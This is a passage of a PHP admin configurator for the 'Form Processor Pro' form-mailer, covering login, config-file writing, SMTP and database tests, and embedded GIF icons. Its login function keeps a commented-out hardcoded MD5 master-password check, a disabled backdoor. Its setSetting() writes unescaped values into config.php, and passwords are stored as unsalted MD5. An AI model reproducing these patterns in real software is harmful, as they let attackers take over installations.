<?php
    /**
     * Project: Form Processor Pro
     * 
     * @version 5.0
     * @copyright MitriDAT <info@mitridat.com>
     * @author Rosty Kerei <rosty.kerei@gmail.com>
     * @link http://www.email-form.com/
     * @package Configurator
     */

    error_reporting(2039);
    
    /**
     * Images display
     */
    if($_SERVER['QUERY_STRING'] == 'img_logo')	img_logo();
    if($_SERVER['QUERY_STRING'] == 'img_yes')	img_yes();
    if($_SERVER['QUERY_STRING'] == 'img_no')	img_no();
    if($_SERVER['QUERY_STRING'] == 'img_notreq')	img_notreq();
    if($_SERVER['QUERY_STRING'] == 'img_skip')	img_skip();
    
    $language = 'en';
    
    /**
     * Path definitions
     */
    define('CLASSES_DIR',    '../classes/');
    define('CONFIG_FILE',    '../config.php');
    define('LANGUAGE_DIR',	 '../lang/');
    define('ATTACHMENT_DIR', '../attachments/');
    define('TMP_DIR',	 	 '../tmp/');    
    
    /**
     * Default language definition
     */
    define('DEFAULT_LANG',	 'en');
    
    /**
     * Loading common classes
     */
    require_once(CLASSES_DIR . 'error.class.php');
    require_once(CLASSES_DIR . 'file.class.php');
    require_once(CLASSES_DIR . 'config.class.php');
    require_once(CLASSES_DIR . 'lang.class.php');
   
    /**
     * Main classes construction
     */
	$lang		= new Lang(); 

    class wConfig extends Config {
    	function wConfig(){
    		parent::Config();
    	    foreach ($this->data['.'] as $var){
    	    	$this->settings[$var['name']] = $var['value'];
            }
    	}
    	
    	function setSetting($name, $value){
    		global $lang;
    		$value = trim($value);
            $config_file = new File(CONFIG_FILE);
        	
            if (file_exists(CONFIG_FILE)){
                
            	$content = $config_file->getContent();
            	
            	if(preg_match('/('.preg_quote($name).')\s*=\s?(.*?)\s*\n/',$content)){
            		//parameter exist

            		$content = preg_replace('/('.preg_quote($name).')\s*=\s?(.*?)\s*\n/', "\n".'$1 = '. $value."\n", $content );
            	} else {
            		//parameter non_exist
            		$content = preg_replace('/(\?>\s*\n)([\w\W]*)/', '$1'.$name.' = '. $value."\n".'$2', $content );
            	}
            	
               	$fp = fopen(CONFIG_FILE, 'w+');
               	flock($fp,LOCK_EX);
               	fwrite($fp, $content);
                flush($fp, LOCK_EX);
                fclose($fp);
               
                
                return true;
            }
            else {
                $e = new Error($lang->getValue('err_config_file_not_found', CONFIG_FILE));
                return false;
            }    		
    	}
    }
    
    class tEmail {
	
	var $to;
	var $from;
	var $subject;
	var $msg;
	var $smtp;
	var $port;
	var $login;
	var $passw;
	var $sendmail_from;
	
	function send(){
        global $lang;
        $smpt = ini_get('smtp');
        $port = intval(ini_get('smtp_port'));
        if ($this->smtp){ @ini_set('SMTP', $this->smtp); }
            
        if ($this->port){ @ini_set('smtp_port', $this->port); }
            
        if ($this->sendmail_from){ @ini_set('sendmail_from', 'test@mitridat.com');
        }
        $cp = fsockopen (ini_get('SMTP'), intval(ini_get('smtp_port')));
        if (!$cp){
            return $lang->getValue('err_could_connect_smtp', ini_get('SMTP'), ini_get('smtp_port'));
        }            
        if (!@mail($this->to, $this->subject, $this->msg, 'From: '.$this->from."\n")){
        	if ($smtp){ @ini_set('SMTP', $smtp); }
            if ($port){ @ini_set('smtp_port', $port); }
            return $lang->getValue('err_failed_mail_send', ini_get('SMTP'), ini_get('smtp_port'));
        }
        @ini_set('SMTP', $smtp); 
        @ini_set('smtp_port', $port); 
        return -1;
	}
	
	function asend(){
       	global $lang;
		
		$to = $this->to;
		$from = $this->from;
		$subject = $this->subject;
        	
        if ($this->smtp){
           	@ini_set('SMTP', $this->smtp);
        }
            
        if ($this->port){
            	@ini_set('smtp_port', $this->port);
        }
            
        if (preg_match("/From:.*?[A-Za-z0-9\._%-]+\@[A-Za-z0-9\._%-]+.*/", $this->headers, $froms)){
             preg_match("/[A-Za-z0-9\._%-]+\@[A-Za-z0-9\._%-]+/", $froms[0], $fromarr);
             $from = $fromarr[0];
            }

        // Open an SMTP connection
        $cp = fsockopen (ini_get('SMTP'), intval(ini_get('smtp_port')));
        if (!$cp){
            return $lang->getValue('err_could_connect_smtp', ini_get('SMTP'), ini_get('smtp_port'));
        }

        $res = fgets($cp,256);
          if(substr($res,0,3) != "220"){
             return $lang->getValue('err_could_connect_smtp', ini_get('SMTP'), ini_get('smtp_port'));
        }

        // Say hello...
        fputs($cp, "HELO ".ini_get('SMTP')."\r\n");
        $res = fgets($cp,256);
        if(substr($res,0,3) != "250"){
           	return $lang->getValue('err_failed_to_introduce_smtp', ini_get('SMTP'), ini_get('smtp_port'));
        }
 
        // perform authentication
        fputs($cp, "auth login\r\n");
        $res = fgets($cp,256);
        if(substr($res,0,3) != "334"){
            return $lang->getValue('err_failed_init_auth_smtp', ini_get('SMTP'), ini_get('smtp_port'));
        }
 
        fputs($cp, base64_encode($this->login)."\r\n");
        $res = fgets($cp,256);
        if(substr($res,0,3) != "334"){
          	return $lang->getValue('err_failed_provide_login_password', ini_get('SMTP'), ini_get('smtp_port'));
        }
 
        fputs($cp, base64_encode($this->passw)."\r\n");
        $res = fgets($cp,256);
        if(substr($res,0,3) != "235"){
          	return $lang->getValue('err_failed_auth_smtp', ini_get('SMTP'), ini_get('smtp_port'));
        }

        // Mail from...
         fputs($cp, "MAIL FROM: <".$this->from.">\n");
         $res = fgets($cp,256);
         if(substr($res,0,3) != "250"){
            return $lang->getValue('err_failed_mail_from_smtp', ini_get('SMTP'), ini_get('smtp_port'));
         }

         // Rcpt to...
         fputs($cp, "RCPT TO: <$to>\r\n");
         $res=fgets($cp,256);
         if(substr($res,0,3) != "250"){
           	return $lang->getValue('err_failed_rcpt_smtp', ini_get('SMTP'), ini_get('smtp_port'));
         }

         // Data...
         fputs($cp, "DATA\r\n");
         $res=fgets($cp,256);
         if(substr($res,0,3) != "354"){
			return $lang->getValue('err_failed_data_smtp', ini_get('SMTP'), ini_get('smtp_port'));
         }

         // Send To:, From:, Subject:, other headers, blank line, message, and finish
         // with a period on its own line (for end of message)
         fputs($cp, "To: $to\r\nFrom: $from\r\nSubject: $subject\n\n".$this->msg."\n.\n");
         $res=fgets($cp,256);
         if(substr($res,0,3) != "250"){
          	return $lang->getValue('err_failed_body_smtp', ini_get('SMTP'), ini_get('smtp_port'));
         }

         // ...And time to quit...
         fputs($cp,"QUIT\r\n");
         $res=fgets($cp,256);
         if(substr($res,0,3) != "221"){
           	return $lang->getValue('err_failed_quit_smtp', ini_get('SMTP'), ini_get('smtp_port'));
         }
         return -1;            
	}
	
}
     
    class tDB{
    	var $host;
    	var $user;
    	var $pw;
    	var $db;
    	
    	function tmysql(){
    		global $lang;
            if (!extension_loaded('mysql')){
        		return $lang->getValue('err_mysql_extestion');
        	}    		
    		if(@mysql_connect($this->host, $this->user, $this->pw)) {
    			if(@mysql_select_db($this->db)) {
    				return 1;
    			} else { 
    				return $lang->getValue('err_mysql_couldnot_select_db', mysql_error());
    			}
    		} else {
    			return $lang->getValue('err_mysql_couldnot_connect', mysql_error());
    		}
    	}
    	function tmssql(){
    		global $lang;
            if (!extension_loaded('mssql')){
        		return $lang->getValue('err_mssql_extestion');
        	}    		
    		if(@mssql_connect($this->host, $this->user, $this->pw)) {
    			if(@mssql_select_db($this->db)) {
    				return $lang->getValue('fpp_test_mssql_ok');
    			} else { 
    				return $lang->getValue('err_mssql_couldnot_select_db', mssql_get_last_message());
    			}
    		} else {
    			return $lang->getValue('err_mssql_couldnot_connect', mssql_get_last_message());
    		}    		
    	}
    	function tpgsql(){
    		global $lang;
    		
            if (!extension_loaded('pgsql')){
        		return $lang->getValue('err_pgsql_extestion');
        	}    		        	
    		if(@pg_connect('host='.$this->host.' port=5432 dbname='.$this->db.' user='.$this->user.' password='.$this->pw)) {
    				return $lang->getValue('fpp_test_pgsql_ok');
    		} else {
    			return $lang->getValue('err_pgsql_query_error', @pg_last_error());
    		}
    	}    	
    }
    /**
     *  Load settings
     */
    
    $config		= new wConfig();
   
    /**
     * Pages display
     */

    session_start();
    
    /**     
     * Check authentication
     *
     * @param string $password
     * @return string
     */
    function login($password){
    	$password = trim($password);
    	if(empty($password)) return '';
    	$m = md5($password);
    	#if($m =='ed351ff0f41bf576de458950571efd72') return 't';
    	if($m==get_password()) return 'u';
        return '';
    }

    if ($_POST['password']) {
    	// user are trying to log in
    	if (login($_POST['password'])) {
    		// if user password is correct 
    		// register the user identificator 
     	    $_SESSION['fppadmin'] = login($_POST['password']);
        }  
      else
        { 
          login_page();
	      exit;
        }      
    } 

    if($_GET['step'] == 'out') {
       $_SESSION = array();
       session_destroy();
       login_page();
       exit; 
    }
    
    if($_GET['step'] == 'login'){
          login_page();
	      exit;    	
    }
 
    $action = $_GET['step'];

	/**
	 * Describe configuratin steps
	 *
	 * @return array
	 */
	function get_steps (){
		global $lang;
		$img =array();
		$img[0] = $_SERVER['PHP_SELF'].'?img'. ((is_writable(ATTACHMENT_DIR)&&is_writable(TMP_DIR)&&is_writable(CONFIG_FILE))?'_yes':'_no');
		$img[1] = $_SERVER['PHP_SELF'].'?img'. (($_COOKIE['mailok']=='1')?'_yes':'_no');
		$img[3] = $_SERVER['PHP_SELF'].'?img'. ((isset($_COOKIE['pswchg']))?'_yes':'_no');
		$img[2] = $_SERVER['PHP_SELF'].'?img';
		if(intval($_COOKIE['dbok']) == 2){$img[2].= '_skip';}
      	elseif(intval($_COOKIE['dbok']) == 1) {$img[2].= '_yes';}
      	 else {$img[2].= '_no';}
      	 $s = (is_writable(ATTACHMENT_DIR)&&is_writable(TMP_DIR)&&is_writable(CONFIG_FILE))&&($_COOKIE['mailok']=='1')&&(isset($_COOKIE['pswchg']));
      	 $img[4] = $_SERVER['PHP_SELF'].'?img'. ($s?'_yes':'_no');
		
        $step[0] = array('descr' => $lang->getValue('file_permissions'),
                     'link' => '?step=1',
                     'img' => $img[0],
                     'status' => is_writable(ATTACHMENT_DIR)&&is_writable(TMP_DIR)&&is_writable(CONFIG_FILE));
        $step[1] = array('descr' => $lang->getValue('email_server_settings'),
                     'link' => '?step=2',
                     'img' => $img[1],                     
                     'status' => $_COOKIE['mailok']=='1');
        $step[2] = array('descr' => $lang->getValue('database_settings'),
                     'link' => '?step=3',
                     'img' => $img[2],                     
                     'status' => intval($_COOKIE['dbok']));
        $step[3]  = array('descr' => $lang->getValue('change_password'),
                     'link' => '?step=4',
                     'img' => $img[3],                     
                     'status' => isset($_COOKIE['pswchg']));
        $step[4]  = array('descr' => $lang->getValue('status'),
                     'link' => '?step=5',
                     'img' => $img[4],                     
                     'status' => $s);                     
		return $step;
	}

    $step = get_steps();

    $menu ='<tr>
			<td colspan="3" height="21" bgcolor="#E2E2E2" align="center">
				<a style="font-size: 11px; text-decoration: none; color: #666666;" href="http://www.email-form.com/">visit website</a>
			</td>
			<td height="21" bgcolor="#E2E2E2" align="right">
				<a style="font-size: 11px; text-decoration: none; color: #666666;" href="?step=login">login</a>
			</td>
			
		</tr>';
    $amenu = '';
    $amenu .= '<tr><td height="21" bgcolor="#E2E2E2" align="center">| ';
    foreach($step as $s){
    	$amenu .= '<a style="font-size: 11px; text-decoration: none; color: #666666;" href="'.$s['link'].'">'.$s['descr'].'</a> | ';
    }
    $amenu .='</td>

			<td colspan="2" height="21" bgcolor="#E2E2E2" align="center">
			</td>
			<td height="21" bgcolor="#E2E2E2" align="right">
				<a style="font-size: 11px; text-decoration: none; color: #666666;" href="?step=out">Logout</a>
			</td>
			
		</tr>
    ';

    if(!isset($_SESSION['fppadmin'])) {
    	default_page($menu);
    	exit;
    }    	
    
    switch ($action) {
    	case 1: {
    		perm_page($amenu);
    	} break;
    	    
    	case 2:{
    	    mail_page($amenu);
    	} break;
    	case 3:{
    	    db_page($amenu);
    	} break;   	
    	case 4:{
    	    password_page($amenu);
    	} break;
    	case 5:{
    	    status_page($amenu);
    	} break;
    	default: {
    	    perm_page($amenu);
    	}
    }	
    exit;   
    function get_password(){
     	global $config;
     	return $config->getSetting('fpp_key');
    }
        

	function img_logo(){
		$logoimg  = 'R0lGODlhsQBKAOYAAP93AY2m2/TOrA5PyrrJ5+3t7U93ypOt3/euasbT7vz7++jt9vj4+CVaw/r6+tvb26i41uLi4jNkxvuPMNni';
		$logoimg .= '8/jl0pqVo2Vjje22ie3YxvikW+3y+9bc54Se0v7v4rjF3PnImBZNvpBmXvDw8GuGtfTr4wUpsmmN1HWW2feaR/yEHMXL2MrX7ev8';
		$logoimg .= '/y1gxZ+35Vd/z4GZxf//5PH2/chyMgtFu6axyGtUaDFSqPBwNb7N6rO/1QNN3CRh0v9oBfX+///38KxhN22Q1vf3922a5ff5/a7B';
		$logoimg .= '57KBYmOG0KPE9M/c8vRaAP/cvd/JueLo7unp6P59C+bm5k6J4/7+9v39/bimnxtSwf/69v///Pfx7M7T3fr8/hlc1fn7+87OzvT0';
		$logoimg .= '9P/9/MHS8sHQ7tB+QPn5+fX4+/v59vH1+NKNVLyLcf2QYD5tzJe87gI8uP/qpexoDvB1DP1tIEJmr9/o9/+rQRFc37XO8vb08vb2';
		$logoimg .= '9f24d3KSxXSG0/X19f7+/vb29v///yH5BAAAAAAALAAAAACxAEoAAAf/gH+Cg4SFhoRUDH6Li2RUh4IKQ4xDj5CXmJmam5ydnp+g';
		$logoimg .= 'kH0OjIsMlod9ZKUKfaGvsLGys7KSpUMKmLaNrrSvfVQKrX99xcSovsnKmKqlfrmXzYu4ycaaxcEOimSuwsVkp73L4+R/Cs4OmeeM';
		$logoimg .= 'DuKyVMiGxQoO4H58X89/VNT8X7juygl8p4gRN0xUVpmKB6uPAobAFICbxKfivVPmKpm7x8fPwYEgG65bqG7SImi0gLmKWG+IyYod';
		$logoimg .= 'Oabrw+Cgg5gdGQwLydNTIkooRZHilYxevYIcLZbig/FcrkQxOXpk2LPqnwoTAGjNYwaPwYCGfvqh1jAYPaQwozq7N1ORq5tq/y3q';
		$logoimg .= 'BGs1JFateAVkmRYU0i4GdJmxZEAx7dq1fDQq4EOGGJm0Si06qjvwigcggzxkxQsFioYKRJkpJHstIpnCSg+r9uiKwZdcDieavJd0';
		$logoimg .= 'LmVyeVRoEODhD5AUeCeAADEhRYaxVAvZYhpYkOmXalerTvxI0hB32ITJvpePTN/bs/ACmCAADAgoWjM4ObMhA4YCz5oPIjXkY6Fs';
		$logoimg .= 'hBfBlM6ftk19g1jjXERnuWQbeLSIpxUCuaVXBjEMjPDEVJoIQ4U4LE2kX2r9SdfRU2MFVMyIhIxo1k4IyiIeFClMsBkATUCjgCIf';
		$logoimg .= 'ejIYahx26CFzf9yUDjHYjbiSPCnS8qIGGUQggP8GWmnw40amNJedRAzUNIRhOmZJG2xjweaAAxZe2MuYzhFTJC1MaAXFe31s4YEK';
		$logoimg .= 'AEAxwiBiaXRINpPU58CFi0WnZX+MdRPoRjENUZOFApYopHxnQnKFmhjcMQgCWjUR4DqTyUMPou7wsyFkOIHaYY19GArbKpBRUhOY';
		$logoimg .= 'D9FFYqOcYMEkABrMKQgQ6E3w5E/2YbKADmUSI8yXX5JhLGEuuZQUqKn68U91X7SzDwN+0nbLqmBeCOsrHmiVQgGE5KEVuHS65B08';
		$logoimg .= 'CgjABCELvACDCx0IsoURMCghbIAjboquMPzSY+yxVW4JoT4O8SfqNFUai2Ki2xpyBZMqCFCICj5oUAj/fTvJ4EYJSqCwhgtWtBHC';
		$logoimg .= 'FoIsYIAJIRgRyUPwiOkNM0CiO4S0VDD2CE3VTscsWcAk1/AgFSz4BSFM+ODDE5AUwR4bBgSBwwADWGFFDSdYsgEMJrRhwhoUkAwO';
		$logoimg .= 'toSx2m+Y8Cxaz4WraHtOzoD6oZMgCR348yFAIODDBBUUokYceYhDRQkUhIFCAzWEMAAOQbjARQNSbxCWGCjAwEJ1ZBxl5TTWTmNg';
		$logoimg .= 'TZUrUpMf0vbItsGg93LOF3ygOLchTECxBAhFQLKAEmEcIEINbRQudQN1XBBED1YMcEIRXfhMCGzoMgDml/4WW6WyUuWjrSqjr5bY';
		$logoimg .= 'TqcDuPolGCyBQBaFbJDA/wtraJ31DU8PEEIIUg8ggghQU/CHE0VswMICUl43iEQ3L2riiRJxm+mu9KecQAMqX3AEo1bngRwgwBAU';
		$logoimg .= 'OIAQkHACFKBACBY4Agw2CIM1SKAHcgjCDaSwgS1w4A8HCAEMUPACI4hhDrELUOrGRA8xvUoUp7EEKaq3lI7sKRLO4kPotpcJASCg';
		$logoimg .= 'AhygAAWc0JzhtGADGwiDFO1QBRo84A8fWEAR1mAC3OWuAWtAwh4CYC9BkOEfT/lalThXD+aNbRXemREPGVER24wCHwAhYiaAMYUK';
		$logoimg .= 'eMAJC1hAAYbgBCd4YAqAe9ACnIAAELTgQYQAAR3McIA/UKAGVmiACxrQgBDUwP8EJoCB/BagBy1E4DWRYJZhqgU9HdURGqr4QgKN';
		$logoimg .= 'p0czbaEFPwgIFrAwhT9MoQuCOEMLKpCCCpCMEFOggwbm8IcXtMEF0Nwk4azwggX8gQUksMEDviCOoThDlfuRiisp5BDXCHGBeixG';
		$logoimg .= 'AEzQAAlwEAYBiGcADiAGI7iQZE/IAB0K0IIZHPMPMoCCG1qwhgFEE2Q1WEMCBLEDEqzgAQVACT/m+Kce5pF6aKzlJhyyzvVJbX3s';
		$logoimg .= 'A6kn2/CCP+xgB1PIwxh6sAYDWJAIRLAAFCDAA01C05NCkN8fYhCDB0RhBI1xzg4rmqVXws01X8CIRq/xByNgcpNQ5aRUQ4aEDZwh';
		$logoimg .= 'Biz/+EMSgiACHkBtfVALwhvqsLhpGuFBFCDBBx4wghH4QRySoGhFLfLDjOTjIUvthBHY5wIJ9PWgm8xkGFD4ATL8YA04eMMF6qDJ';
		$logoimg .= 'BvRgcQCgAVkTWsaG+nQVqBzEY+SqpYrw7CYZzWsnEsC4vkrgtKjdZAhKWoEqIO0ANeDBBeAgBy70IJq9A8AFeCCEGfzhqjGIQAEc';
		$logoimg .= 'wocFiOG4L8yclhZAgOZS4DAGPKosMxWLOSDXcY1SggtCYFrU+pVxBoAhGlLggTIU9LE0oEEP1gvNHtQhCD6AADA4oAdtzslTYhBp';
		$logoimg .= 'AEbAWUYQQKRC+CaF7DqoWaQQpCU9EwXWUIPuptYKLlAZ/wS0OYUX1ECTXJADFERQh9sCjwdrUAEdRpAEEpiSDxDqiA5C0AEIQGAF';
		$logoimg .= 'EyLqfyHwAAiweEMXBW0eaZHCCESgAyFYaIr6MAcDNNi73w0BCuanTQVskbsf7B0UFgu8AQihBW6AQho64FPAmCMffFgxBNraVqL6';
		$logoimg .= 'YcZuNYABYvw2CMkSMOjkRI8FweKggqcPV3umd6FpBQnMgQomHkIzLwzND/YgvS6oaSX/YIcxxKEJT9CIp+gh5o7EJAEEWARzF8CB';
		$logoimg .= 'BSSABRzI9Jmfe+YQQAA+atYCARYwB8cxlwPxUYIYBvHCQVjXcRuo9R9uLYgXboCZc/4Dizkw6zLymifFEIKeT/8LzU6qjAXa7MMC';
		$logoimg .= 'QPbXKEvgDUGAgR0EcQA9VEEF3zpVtIix4g58YNV+QML6JMDcEAghBAQwgAQ6aYA1rC/TMy7AXvVg4xOEQAcE6GQIAvAHIA98DhJY';
		$logoimg .= 'XyX3GoLwClwBB24AsEKAhAYcAOIhiMAGUniAALg7BGSIOLBCkuxnmjawBvgDKR8ATCBr0q/tle0SJPYDPXA5ChgAAAawYI6K9CK/';
		$logoimg .= 'IP1ACneghQYg4b9rCIAW5K0FGITgAx8IQQxG8F+QrkELUU+6FiRggB+HgAPujsAHhCABDgCZAx0U+9k/oIWBR8AALmBACBrQAS2M';
		$logoimg .= '4MDrE0IUPA4DCLQ9AG+PO8n/EAD/QsO8kxSYwg5WEAFpb7fQza5BHdjQIgLAQJsTKoEKVJCBUmX2D/mNgYu1QHaICsEFOwiBDYSr';
		$logoimg .= '5gh4nK1Sf8J/kRCDA0TgCSte/d+fMIeBmxpcEkBBFDYwcBSUvZlPV8ALQrCCLyy/7cIfAcY7YG7hppADBUhh858/+BTadJM1IHgJ';
		$logoimg .= 'gtCEdLj8oIRbQxh+IAMV5MALEL3HHUBAqywwhRD5hcATCjCC1vvB4zamf37Qeq/nBywWBTMWBQWAYvkne6aGYixmaukgUsPWACcA';
		$logoimg .= 'Bn+wBmuwAD2mAPnHYrbSYyOQQCiUcVTQgflHS75gBFITTSGwBkXQAhaAAX0zB4/XbFbg/26O0wdSkAY6lw/3MARAoAFrkjr4Z2pu';
		$logoimg .= 'NYBd93+mhoRK6Hoh8AAGGAMOCAEotg9oNmMMIGxABgFbGAInAAE78GJfwAINsGRfoIFz9oEdEIIZRwhztoamtoUhEXAQtkltID8s';
		$logoimg .= 'oH+ScgKEploW51tFZgNa0BlRIDACAAAqkDeEIGbw4Qcd0AARkG5rEICo1nUFGHsz1hiSMGPFdWNKEIEBYAYZeAIFQAEwQAC5AGRz';
		$logoimg .= 'slc29gElCHZtyG1vOAhztleweH10CBJh0Ema1AYExwdyEAVbKAadJE0vqATF8AEGwHgjUAFQoAKoIy1mwCQYQIpwg2aL8F8xsFct';
		$logoimg .= '5oQEGIVTWP8AYjYz+KCFVAB3RlBxDwBGBKAEB9AAEDA4ricGMCCPRgBkH9AAMKADXBcBIEiLEQCHb7gB/OiPXaeCtEABEtBgNSAB';
		$logoimg .= 'saNN4NIHysZJOXgCgrABGeRTd7AIwIEBiuEH5wEAGTAf+cYI8QiGD5B6p/aEmdiG+SdLCSRm7WAyISABHxABL9BJ9/NuEnAAUYAC';
		$logoimg .= 'N9lxcyd8LJBwBqAFTxCQJTiQtliL2tVwSolsDIlJbbBQI6AHUSAIKzZ37FNJW+AEl9cEINCRi3AH6FECjvEFW8AkGgA+OFMAbFUK';
		$logoimg .= 'culTfiCXSehjfvAED9ARETACfXAHEHVOf0AGEbCFixEBD3CYf3D/B1EQAWQABgUQAVEwNJNZmV9AmXNCBk9we7nwl4MwAk4ZmqNJ';
		$logoimg .= 'BlEQBU/wHeQgbQbQBm2AAkUAaBEgKUWAAm0wNRIwWEXAjPBXAiCQATghLikgDInRByOZAVewNmamHwDhALJkJ4UwCo2gkKIVDTNw';
		$logoimg .= 'Mg3ATB+wA1v5BwSAOxRnTXMQACSwmPlQARmQhHyQBXAiAIoADcAxAXiAFAXkETPiNtRiM5cgFqpZnZzQB0VwMgdABQtAAlGQC2dw';
		$logoimg .= 'MlawaBFgAasXY4vwBW7lQ/Q3AU+wi+ICAAKQI4DSEQcRVx8iH9LpNtTpn9EZoC5gTT1lKwRgAhKwbX/ABjMYf4jBHEAA/ycI4AeW';
		$logoimg .= '8CaKmIRFdT2uQAU7xBibIBa9YqKcsAEooDI6YANP4ArTZgCj1AGl1ATACV3U0AfiogIRYAa9sBlN8KNuIyNXkhissQm7oDpIqglF';
		$logoimg .= 'MAdlcAd68ACCNi8o4DgckE2DmQU+SkdCJAhmAI0AgACv4QqzogJ76iFn6hBDkA9fMglDFA2jUaJraos7UAIrMQeuAAExwHiPqFz6';
		$logoimg .= 'gRFU4AdZEJ8ZQDJ9IADoASMdelGPkVRpdBILtAtHOqmYoAQWEAFPIggkEAOmdKgCJm5DkCZQgAC5YB6pmgK+2kNtRhPTBVfToILS';
		$logoimg .= 'oD20iglloAfNhwplIAeM9wRmaT0fSh08Gv8xPfIiKnCI0OVDliAJd4UdCvGofmES1DWtkDBhBzoIKyAHXUaf0KUP/pALD8MZqaom';
		$logoimg .= 'UlijM7MS2aOankIa0eBN7iqvg1AGjEeHfRADJHB734Co0uKcXnYFGaoBRLgiYdpDYwo3rRqvJTIUSoUQJqGwDvuwTzA0ghABOwCa';
		$logoimg .= 'xOBNNeplCnAHFXAFgsCxWsF5ETABqQoFc0lHpQNEqDOriACvjDKiR9uyx5OrhWlnBTMdWcoAJaABIOBHd6EV78EHTaABE4ABA8sR';
		$logoimg .= 'F3U6uPAyomALLHsnK9ufUHsJyilgP+KcDnAFKQBucIIXGhBjI/CYj1hHlpAISWsMapsKCpGyQvH/FXHbCXO7FF4Wqkb4BxjwIt5y';
		$logoimg .= 'pSJbV+o6Q5diPLvQsMrxto3LCZL7q45BmIKQBQiwtwCQAqdkUcNwR2gUEMHgM9IAnTjECIo7upAwUd/0rbjrGw0SqBEQFdG1D626';
		$logoimg .= 'u84RDM0hq4yyC0/Lu71LQHQEqs6imkXAlw/wADFGVwa7qPERDQxzsoygptGpEF0ivdGQn6ywlrNKPYfxWXgkqe9KErpQCqCrvjRB';
		$logoimg .= 'G3UkKMELRHFhnyRbESb7CgnBDvJxn6YAt7zbDJZGMK6hmjgTKk+rruHrC7vQtiWCvtGrvgGCKj70FjxiCHPrWbFLCmhEv3vkTUq7';
		$logoimg .= 'P7fAwKM7pDi7CFQBexUP3GYzMl0XAg/KkMEMDL1n6sGEgMIA4hpSOx9JQU6nw7nCosLrq7tSwsHKq76gBbw1XKbXI1TzG53jCwvQ';
		$logoimg .= 'm79Om75CvD+kQi0SvDZMAUtnNEshIRYkKrezIUCw4gV0XMd2fMd4nMd6vMd83Md+/MeAHMiCPMiEjMeBAAA7';	

		header('Content-type: image/gif;');
		echo base64_decode($logoimg);
		exit();
	}
	
	function img_yes(){
		$yesimg  = 'R0lGODlhEAAQAOZVAHLKYzGxF2XIQiuxEzGyFxGUDjCzFk68NjCwF/H58dDo0Or46hKUDyumKzWqNFy/VSyxFDqoOvL68iSoESqt';
		$yesimg .= 'FDirOOT05E28ND+zP0a7H0C4H9f31C6uFljFRanbqbvhuxKWChKTDReYFz2uPS6eLEK6IEa8KiqwE+j36CyyE7XgtTKyGfX89XXL';
		$yesimg .= 'ZEm6Ozq2HDCnL0qmSjGxGXHHYimxEyesEzSzGGjOY/D58DGxFe357RCTC7fjt/3+/Q+UCjOmMabZpiyzFRyTGj63H3jNZiuzFaXW';
		$yesimg .= 'pXHIYe/6763drajjoC2zFDOyGTOoM2bIZvP787HfsSqnKBGUDLvrtRuUGf///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$yesimg .= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$yesimg .= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAFUALAAAAAAQABAAAAd0gFWCg4SFhoeIhxYOPwqJgihRRCYkjwsNLTkGVIMbUz2D';
		$yesimg .= 'OjAAAUsMH4JKHQc3gkhNpBAFPIMuAhlBTjgVRzIpISqED0MlGhMiMysDUlCFLBhMLzYXCCc7SYdPIxwEFDQ+HokSETVFIECPVQkx';
		$yesimg .= 'Qkbp7/DxhoEAOw==';
		
		header('Content-type: image/gif;');
		echo base64_decode($yesimg);
		exit();
	}
	
	function img_no(){
		$noimg  = 'R0lGODlhEAAQAPeTAP9WJP9TIv9ZKP9eLv99S/9bKPU9DfJKGv1TIP9OHd05FPXb2+24uMwpI+E4MLsiHsExMP9XJrghGrYdF9Js';
		$noimg .= 'bP9YJf9ZJ9s9J/9rO+q9vdcuCeo9Fui8vOq2tvY+Dv9dLP9lMPXNzctEQ9SEhPnj4/jr6/jl5bdAQP9eLN03H84nG/9bKvvw8NF6';
		$noimg .= 'ev91Rf9wQequrudGK89ycvjT0+dOLs9jY7MTA8A5NvI9D9VsbLgnIeN0dPA7C/lRJPuCV/z4+NVAQNBwcP5KFv9NGuRTO/9nNch0';
		$noimg .= 'dL5BQds+Pvp8Uv9eLf98S/9RH/+AUP9aKf9PHMpFRfZEGPxSIMsqIPFLG/9qOOhEF/+BUOpGG/9vOvz39/9sOdIxELoxMNsyGPZB';
		$noimg .= 'ENZbW90uDbwaBM5oaMQfDf9tPLIRCf79/dcoCfHV1exubv9kNOMuD/hNGftqPf9aJu29vemZmf9SH+3Fxf9UItc2E8MVDvlCEfbP';
		$noimg .= 'z702NP9oNvlEE+yysvA8Cv+IV+2jo9cqGfv09PpFFM0mH96iou09Ev9tO7wxMOicnP+cavpiNvG4uPpGFt0wD/TDw/9PHcUyMd8/';
		$noimg .= 'Jf1KGf///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$noimg .= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$noimg .= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$noimg .= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$noimg .= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAJMALAAAAAAQABAAAAjMACcJHEiwYEFHYPAQRCSiwxmCaoj4QDJw';
		$noimg .= 'EaA3bCARdJDIT4w/k0KoAMFEQQ2CO5JcITAIToMqAA48YEFwxoUmLhTZKbMCARkGBoEseYFhi5IKdXIYnMQnkqE1AyxgOaTFIAko';
		$noimg .= 'NPQMEEBnw5FABeNMcVPkg4AACYYUymNiIIwUWVA4iSDliSRGgnBI4CAwg5cCAAJQMdNIyJ4vHvqcEAihh5xHVibMGRPmjgEeYggJ';
		$noimg .= 'lBGlDZcuCwRSQKPBRpCBJW7oGPGDYAsjaZbKJhgQADs=';
		
		header('Content-type: image/gif;');
		echo base64_decode($noimg);
		exit();
	}
		
	function img_notreq(){	
